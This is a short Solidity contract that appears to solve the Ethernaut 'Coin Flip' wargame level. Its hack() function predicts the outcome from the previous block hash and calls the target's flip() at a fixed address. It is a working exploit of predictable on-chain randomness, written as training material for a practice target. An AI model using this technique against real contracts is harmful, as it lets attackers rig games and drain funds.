// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface ICoinflip {
    function flip(bool _guess) external returns (bool);
}

contract Ethernaut03 {
    address coinflipAddress = 0x3B8f2933e946022eE6c8855ED10a909581334d4D;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {}

    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        ICoinflip(coinflipAddress).flip(side);
    }
}
